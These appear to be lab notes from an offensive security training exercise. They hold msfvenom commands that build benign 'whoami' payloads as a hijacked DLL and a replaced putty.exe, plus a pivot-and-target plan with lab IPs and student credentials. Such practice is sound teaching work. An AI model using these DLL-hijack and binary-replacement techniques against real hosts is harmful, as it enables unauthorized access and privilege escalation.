## Showcase
### Fake Payload write permissions (dll emplacement)
    msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
____________________________________________________________________________________________________________________
## Showcase
### Fake Payload rename permissions (exe replacement)
    msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\student\Desktop\whoami.txt' -f exe > putty.exe
____________________________________________________________________________________________________________________
## For the DEMO!!!
### To kill the putty.exe we downloaded and launched.
    (get-process | ?{$_.name -like "putty"}).kill()
____________________________________________________________________________________________________________________
# Scheme of Maneuver:
## >Jump Box
## ->Pivot: 192.168.28.105
## -->T1: 192.168.28.5

## Target Section:

## Pivot
### Hostname: ftp.site.donovia
### IP: 192.168.28.105
### OS: Ubuntu 18.04
### Creds: comrade :: StudentReconPassword
### Last Known SSH Port: 2222
### Malware: none
### Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

### T1
### Hostname: donovian-windows-private
### IP: 192.168.28.5
### OS: Windows ver: Unknown
### Creds: comrade :: StudentPrivPassword
### Last Known Ports: 3389
### PSP: unknown
### Malware: unknown
### Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
